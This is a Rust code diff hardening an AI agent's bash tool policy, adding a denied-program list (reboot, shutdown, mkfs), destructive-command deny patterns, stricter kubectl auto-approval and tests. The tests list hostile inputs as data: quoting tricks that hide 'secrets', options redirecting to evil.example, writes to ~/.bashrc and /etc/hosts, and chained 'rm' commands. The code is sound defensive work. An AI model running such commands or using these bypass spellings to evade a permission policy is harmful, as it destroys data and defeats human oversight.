@@ -37,8 +37,11 @@ impl Hooks for PolicyHook {
 pub enum RuleMatcher {
     Any,
     Tool(String),
-    /// Matches bash's command at a whitespace boundary. Use CommandPolicy as well
-    /// when shell syntax must be restricted.
+    /// Matches bash's command at a word boundary, compared like the allowlist of
+    /// [`CommandPolicy`] (lowercased, whitespace collapsed). An Allow rule does not match a
+    /// command with a pipe or with syntax the allowlist rejects, so it cannot let a second
+    /// command through. Quoting is not interpreted: a Deny prefix stops the plain spelling
+    /// only. Use CommandPolicy as well when shell syntax must be restricted.
     CommandPrefix(String),
 }
 
@@ -54,15 +57,14 @@ impl Rule {
             RuleMatcher::Any => true,
             RuleMatcher::Tool(name) => name == tool,
             RuleMatcher::CommandPrefix(prefix) => {
-                if tool != BASH || prefix.trim().is_empty() {
+                let prefix = normalize(prefix);
+                if tool != BASH || prefix.is_empty() {
                     return false;
                 }
                 args.get("command").and_then(Value::as_str).is_some_and(|command| {
-                    let command = command.trim_start();
-                    command == prefix
-                        || command
-                            .strip_prefix(prefix)
-                            .is_some_and(|suffix| suffix.starts_with(char::is_whitespace))
+                    let chains =
+                        command.contains('|') || ALLOWLIST_FORBIDDEN.iter().any(|token| command.contains(token));
+                    !(chains && self.decision == Decision::Allow) && begins_with(&normalize(command), &prefix)
                 })
             }
         }
@@ -124,24 +126,108 @@ impl ToolPolicy for RulePolicy {
     }
 }
 
-/// Patterns rejected for every `bash` command, compared after lowercasing and
+/// Patterns rejected for every `bash` command, compared as substrings after lowercasing and
 /// collapsing whitespace. Easy to bypass on purpose; the allowlist is the real control.
 pub const DEFAULT_DENIED_PATTERNS: &[&str] = &[
     "rm -rf /",
     "rm -fr /",
     "--no-preserve-root",
-    "mkfs",
     "dd if=",
     ":(){",
-    "shutdown",
-    "reboot",
-    "poweroff",
-    "halt",
-    "init 0",
-    "init 6",
     "> /dev/sd",
     "> /dev/nvme",
 ];
+
+/// Programs rejected for every `bash` command, as is `init` or `telinit` followed by `0` or
+/// `6`; `mkfs` also covers `mkfs.<type>`. A name counts as a word of a command, compared by
+/// file name (`/sbin/reboot`) after quotes and backslashes are removed. The arguments of
+/// read-only programs, such as `grep`, `last`, `journalctl`, `cat` and `echo`, do not count,
+/// so `last reboot` or `grep -i shutdown` may run. Like the patterns, easy to bypass on
+/// purpose.
+pub const DENIED_PROGRAMS: &[&str] = &["shutdown", "reboot", "poweroff", "halt", "mkfs"];
+
+/// Programs that cannot run another program: what follows them on the command line is data,
+/// such as a pattern or a file name, never a command.
+const READ_ONLY_PROGRAMS: &[&str] = &[
+    "grep",
+    "egrep",
+    "fgrep",
+    "zgrep",
+    "rg",
+    "last",
+    "lastb",
+    "journalctl",
+    "echo",
+    "printf",
+    "cat",
+    "zcat",
+    "head",
+    "tail",
+    "wc",
+    "sort",
+    "uniq",
+    "cut",
+    "tr",
+    "jq",
+    "ls",
+    "stat",
+    "file",
+    "man",
+    "which",
+    "whereis",
+];
+
+/// Programs that run the command after their options, looked through when deciding whether
+/// a command is one of [`READ_ONLY_PROGRAMS`].
+const WRAPPERS: &[&str] = &["sudo", "doas", "nice", "nohup", "time", "command", "exec", "env"];
+
+/// Characters that end one command and start another, or start a command inside another.
+const COMMAND_SEPARATORS: &[char] = &['|', ';', '&', '(', ')', '{', '}', '`', '\n', '\r'];
+
+/// The first program of [`DENIED_PROGRAMS`] that `command` runs, as far as words can tell.
+fn denied_program(command: &str) -> Option<String> {
+    let lowered = command.to_lowercase();
+    for part in lowered.split(COMMAND_SEPARATORS) {
+        // Quotes and backslashes only change how the shell splits words, not their letters.
+        let words: Vec<String> = part
+            .split_whitespace()
+            .map(|word| word.chars().filter(|c| !matches!(c, '"' | '\'' | '\\')).collect())
+            .collect();
+        let mut rest = words
+            .iter()
+            .map(String::as_str)
+            .skip_while(|word| is_assignment(word))
+            .map(file_name);
+        let mut program = rest.next();
+        while program.is_some_and(|name| WRAPPERS.contains(&name)) {
+            program = rest.find(|word| !word.starts_with('-') && !is_assignment(word));
+        }
+        if program.is_some_and(|name| READ_ONLY_PROGRAMS.contains(&name)) {
+            continue;
+        }
+        let names: Vec<&str> = words.iter().map(|word| file_name(word)).collect();
+        for (index, name) in names.iter().enumerate() {
+            let runlevel = matches!(*name, "init" | "telinit") && matches!(names.get(index + 1), Some(&"0" | &"6"));
+            if DENIED_PROGRAMS.contains(name) || name.starts_with("mkfs.") || runlevel {
+                return Some(name.to_string());
+            }
+        }
+    }
+    None
+}
+
+/// The part of `word` after its last `/`.
+fn file_name(word: &str) -> &str {
+    word.rsplit('/').next().unwrap_or(word)
+}
+
+/// Whether `word` sets a shell variable for the command, as in `LANG=C sort`.
+fn is_assignment(word: &str) -> bool {
+    word.split_once('=').is_some_and(|(name, _)| {
+        name.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
+            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+    })
+}
 
 /// Shell syntax rejected when an allowlist is set: anything that could chain or redirect
 /// beyond a plain pipeline of allowlisted programs.
@@ -149,7 +235,7 @@ const ALLOWLIST_FORBIDDEN: &[&str] = &[";", "&", "`", "$(", ">", "<", "\n", "\r"
 
 /// Policy for the `bash` tool.
 ///
-/// - Every command is checked against denied patterns.
+/// - Every command is checked against denied patterns and [`DENIED_PROGRAMS`].
 /// - With an empty allowlist, other commands are allowed.
 /// - With an allowlist, a command must be a pipeline (`a | b`) whose every segment starts
 ///   with an allowlisted prefix, such as `kubectl get` or `journalctl`. Other shell
@@ -185,6 +271,9 @@ impl CommandPolicy {
         let normalized = normalize(command);
         if let Some(pattern) = self.denied_patterns.iter().find(|p| normalized.contains(p.as_str())) {
             return Decision::Deny(format!("command matches the denied pattern {pattern:?}"));
+        }
+        if let Some(program) = denied_program(command) {
+            return Decision::Deny(format!("command runs the denied program {program:?}"));
         }
         if self.allow_prefixes.is_empty() {
             return Decision::Allow;
@@ -259,15 +348,86 @@ impl ToolPolicy for CommandPolicy {
 /// with `--server` (docs/p6-online-access-review.md, appendix 9.3, K1).
 const CONNECTION_OPTIONS: &[&str] = &["--server", "--kubeconfig", "--token", "--insecure-skip-tls-verify"];
 
+/// Punctuation that a command approved without asking may contain, besides letters, digits
+/// and whitespace. None of it lets the shell run or read anything but what the words spell;
+/// every other character asks, such as quotes and `\` (which hide words from these checks),
+/// `$` (expansion), `*`, `?` and `[` (file names), `{` (brace expansion), parentheses, `#`,
+/// and the syntax the allowlist rejects.
+const PLAIN_PUNCTUATION: &[char] = &['-', '_', '.', '/', ':', '=', ',', '@', '+', '|', '^', '~', '!'];
+
+/// kubectl options that a command approved without asking may pass: they choose what to
+/// read and how to show it. Every other option asks, among them those that send the request
+/// elsewhere (`--server`), use other credentials (`--user`, `--token`, `--as`), write files
+/// (`--profile-output`, `--cache-dir`), read any API path (`--raw`) or read manifests
+/// (`--filename`). Checked against kubectl v1.36.1.
+const KUBECTL_OPTIONS: &[&str] = &[
+    "namespace",
+    "context",
+    "request-timeout",
+    "all-namespaces",
+    "output",
+    "selector",
+    "field-selector",
+    "label-columns",
+    "show-labels",
+    "show-kind",
+    "no-headers",
+    "sort-by",
+    "chunk-size",
+    "ignore-not-found",
+    "show-managed-fields",
+    "subresource",
+    "show-events",
+    "for",
+    "types",
+    "container",
+    "previous",
+    "since",
+    "since-time",
+    "tail",
+    "timestamps",
+    "all-containers",
+    "all-pods",
+    "prefix",
+    "limit-bytes",
+    "max-log-requests",
+    "ignore-errors",
+    "pod-running-timeout",
+    "containers",
+    "sum",
+    "use-protocol-buffers",
+    "show-capacity",
+    "show-swap",
+    "recursive",
+    "api-version",
+    "api-group",
+    "cached",
+    "categories",
+    "namespaced",
+    "verbs",
+    "client",
+];
+
+/// Short forms of [`KUBECTL_OPTIONS`] that take a value, given next or attached (`-oyaml`).
+const KUBECTL_SHORT_WITH_VALUE: &[char] = &['n', 'o', 'l', 'L', 'c'];
+
+/// Short forms of [`KUBECTL_OPTIONS`] that take no value; each must stand alone.
+const KUBECTL_SHORT_FLAGS: &[char] = &['A', 'p', 'R'];
+
 /// Bash commands that run without asking where a rule would otherwise ask for approval.
 ///
-/// A command is covered only when it is a plain `|` pipeline whose every segment starts with
-/// a listed prefix, compared like the allowlist (whitespace collapsed, lowercased), and it
-/// contains none of these: the syntax the allowlist rejects, the word `secret`, a URL
-/// (`://`), a connection option (`--server`, `--kubeconfig`, `--token`,
-/// `--insecure-skip-tls-verify`), or, in a kubectl segment, a short option containing `s`,
-/// which covers `-s` in every spelling. Like the allowlist the check is lexical: it decides
-/// only whether to ask, and never turns a denial into an approval.
+/// A command is covered only when all of these hold:
+/// - it is a `|` pipeline whose every segment starts with a listed prefix, compared like
+///   the allowlist (whitespace collapsed, lowercased);
+/// - it consists of letters, digits, whitespace and the punctuation `- _ . / : = , @ + | ^ ~ !`,
+///   so no quoting, escaping, expansion or other shell syntax can change what runs;
+/// - it contains neither the word `secret` nor a URL (`://`), and no segment passes a
+///   connection option (`--server`, `--kubeconfig`, `--token`, `--insecure-skip-tls-verify`);
+/// - every option of a kubectl segment is one of the read-only options this module lists,
+///   such as `-n`, `-o`, `-l`, `--context` and `--tail`.
+///
+/// Like the allowlist the check is lexical: it decides only whether to ask, and never turns
+/// a denial into an approval.
 #[derive(Clone, Debug, Default, PartialEq, Eq)]
 pub struct AutoApprove {
     prefixes: Vec<String>,
@@ -288,27 +448,54 @@ impl AutoApprove {
 
     /// Whether `command` may run without asking.
     pub fn covers(&self, command: &str) -> bool {
-        if self.prefixes.is_empty() || ALLOWLIST_FORBIDDEN.iter().any(|token| command.contains(token)) {
+        let plain = command
+            .chars()
+            .all(|c| c.is_alphanumeric() || c == ' ' || c == '\t' || PLAIN_PUNCTUATION.contains(&c));
+        if self.prefixes.is_empty() || !plain {
             return false;
         }
         let normalized = normalize(command);
         if normalized.contains("secret") || normalized.contains("://") {
             return false;
         }
-        normalized
-            .split('|')
-            .map(str::trim)
-            .all(|segment| self.prefixes.iter().any(|prefix| begins_with(segment, prefix)) && !redirects(segment))
+        // Without quotes in the command, every `|` separates two segments.
+        command.split('|').all(|raw| {
+            let segment = normalize(raw);
+            self.prefixes.iter().any(|prefix| begins_with(&segment, prefix))
+                && !redirects(&segment)
+                && kubectl_options_allowed(raw)
+        })
     }
 }
 
 /// Whether a normalized pipeline segment passes an option that can send its request elsewhere.
 fn redirects(segment: &str) -> bool {
-    let kubectl = segment.split(' ').next() == Some("kubectl");
-    segment.split(' ').any(|word| {
-        CONNECTION_OPTIONS.iter().any(|option| word.starts_with(option))
-            // Only for kubectl: elsewhere short options mean other things (jq -s, grep -s).
-            || (kubectl && word.starts_with('-') && !word.starts_with("--") && word.contains('s'))
+    segment
+        .split(' ')
+        .any(|word| CONNECTION_OPTIONS.iter().any(|option| word.starts_with(option)))
+}
+
+/// Whether a pipeline segment that runs kubectl passes only read-only options. Options are
+/// compared with their case: kubectl's `-A` and `-a` differ.
+fn kubectl_options_allowed(segment: &str) -> bool {
+    let mut words = segment.split_whitespace();
+    if !words
+        .next()
+        .is_some_and(|program| program.eq_ignore_ascii_case("kubectl"))
+    {
+        return true;
+    }
+    words.filter(|word| word.starts_with('-')).all(|option| {
+        if let Some(long) = option.strip_prefix("--") {
+            let name = long.split_once('=').map_or(long, |(name, _)| name);
+            return KUBECTL_OPTIONS.contains(&name);
+        }
+        let mut letters = option.chars().skip(1);
+        match letters.next() {
+            Some(flag) if KUBECTL_SHORT_FLAGS.contains(&flag) => letters.next().is_none(),
+            Some(flag) => KUBECTL_SHORT_WITH_VALUE.contains(&flag),
+            None => false,
+        }
     })
 }
 
@@ -567,6 +754,160 @@ mod tests {
         assert_eq!(denied_by_rule.check("bash", &ls).await, Decision::Deny("denied".into()));
         let unmatched = RulePolicy::new(Vec::new()).auto_approve(list);
         assert!(denied(unmatched.check("bash", &ls).await));
+    }
+
+    #[test]
+    fn auto_approval_asks_when_quoting_or_expansion_could_change_a_word() {
+        let list = AutoApprove::new(["kubectl get", "grep"]);
+        for command in [
+            "kubectl get sec\"\"rets -A -o yaml",
+            "kubectl get sec''rets -A -o yaml",
+            "kubectl get sec\\rets -A -o yaml",
+            "kubectl get sec${X}rets -A -o yaml",
+            "kubectl get s?crets -A",
+            "kubectl get s[e]crets -A",
+            "kubectl get sec{r,}ets -A",
+            "kubectl get pods \"--server=evil.example:443\"",
+            "kubectl get pods --ser''ver=evil.example:443",
+            "kubectl get pods \"-s\" evil.example:443",
+            "kubectl get --raw \"https:\"//evil.example/x",
+            "grep error app.log # note",
+        ] {
+            assert!(!list.covers(command), "{command}");
+        }
+    }
+
+    #[test]
+    fn auto_approval_asks_for_kubectl_options_outside_the_read_only_set() {
+        let list = AutoApprove::new(["kubectl get", "kubectl version", "kubectl logs"]);
+        for command in [
+            "kubectl version --client --profile=heap --profile-output=/home/u/.bashrc",
+            "kubectl get pods --cache-dir=/home/u/.kube",
+            "kubectl get --raw /api/v1/namespaces/default/pods",
+            "kubectl get pods --context remote --user other-admin",
+            "kubectl get pods --cluster other",
+            "kubectl get pods --as=system:admin",
+            "kubectl get pods -v=9",
+            "kubectl get -f pods.yaml",
+            "kubectl get pods -w",
+            "kubectl get pods -Ap",
+            "kubectl logs web --insecure-skip-tls-verify-backend",
+        ] {
+            assert!(!list.covers(command), "{command}");
+        }
+    }
+
+    #[test]
+    fn auto_approval_covers_read_only_kubectl_options() {
+        let list = AutoApprove::new(["kubectl get", "kubectl logs", "kubectl top", "grep"]);
+        for command in [
+            "kubectl get pods -n kube-system -o wide",
+            "kubectl get pods -nkube-system -oyaml",
+            "kubectl get pods --namespace=prod --context=remote --sort-by=.metadata.name",
+            "kubectl get pods -A -l app=web,tier=api --field-selector=status.phase!=Running",
+            "kubectl logs web-1 -c app --previous --tail=200 --since=1h",
+            "kubectl top pods -A --sort-by=cpu",
+            "grep -i ^error ~/logs/app.log",
+        ] {
+            assert!(list.covers(command), "{command}");
+        }
+    }
+
+    #[test]
+    fn power_programs_are_denied_wherever_a_command_starts() {
+        let policy = CommandPolicy::new(Vec::<String>::new());
+        for command in [
+            "reboot",
+            "sudo reboot",
+            "sudo -u root reboot",
+            "/sbin/re''boot",
+            "sudo systemctl re\\boot",
+            "systemctl --no-wall poweroff",
+            "shutdown -h now",
+            "timeout -s KILL 5 halt",
+            "find / -exec reboot \\;",
+            "xargs reboot",
+            "bash -c \"reboot\"",
+            "init 6",
+            "sudo telinit 0",
+            "mkfs.ext4 /dev/sdb1",
+            "uptime; reboot",
+            "uptime && reboot",
+            "uptime | poweroff",
+            "echo `reboot`",
+            "echo $(reboot)",
+            "(reboot)",
+            "{ reboot; }",
+            "uptime\nreboot",
+        ] {
+            assert!(denied(policy.evaluate(command)), "{command}");
+        }
+    }
+
+    #[test]
+    fn power_words_in_arguments_of_read_only_programs_are_allowed() {
+        let policy = CommandPolicy::new(Vec::<String>::new());
+        for command in [
+            "kubectl get pods -n asphalt-prod",
+            "last reboot",
+            "journalctl -b -1 --no-pager | grep -i reboot | tail -n 20",
+            "kubectl get events -A | grep -i shutdown",
+            "grep -c 'graceful shutdown' /var/log/app.log",
+            "sudo grep -i reboot /var/log/syslog",
+            "LANG=C env TZ=UTC grep -c shutdown /var/log/syslog",
+            "systemctl status reboot.target",
+            "kubectl logs reboot-job-1",
+        ] {
+            assert_eq!(policy.evaluate(command), Decision::Allow, "{command}");
+        }
+    }
+
+    #[tokio::test]
+    async fn command_prefix_rules_compare_like_the_allowlist() {
+        let deny = RulePolicy::new(vec![
+            Rule {
+                matcher: RuleMatcher::CommandPrefix("kubectl delete".into()),
+                decision: Decision::Deny("no deletes".into()),
+            },
+            Rule {
+                matcher: RuleMatcher::Any,
+                decision: Decision::Allow,
+            },
+        ]);
+        for command in ["kubectl  delete pod x", "KUBECTL delete pod x", "kubectl\tdelete pod x"] {
+            assert_eq!(
+                deny.check("bash", &serde_json::json!({ "command": command })).await,
+                Decision::Deny("no deletes".into()),
+                "{command}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn an_allow_prefix_does_not_let_a_second_command_through() {
+        let allow = RulePolicy::new(vec![Rule {
+            matcher: RuleMatcher::CommandPrefix("kubectl get".into()),
+            decision: Decision::Allow,
+        }]);
+        assert_eq!(
+            allow
+                .check("bash", &serde_json::json!({"command": "kubectl get pods -A"}))
+                .await,
+            Decision::Allow
+        );
+        for command in [
+            "kubectl get pods ; rm -rf ~/scratch",
+            "kubectl get pods && rm x",
+            "kubectl get pods | sh",
+            "kubectl get pods > /etc/hosts",
+            "kubectl get $(rm x)",
+            "kubectl get pods\nrm x",
+        ] {
+            assert!(
+                denied(allow.check("bash", &serde_json::json!({ "command": command })).await),
+                "{command}"
+            );
+        }
     }
 
     #[tokio::test]
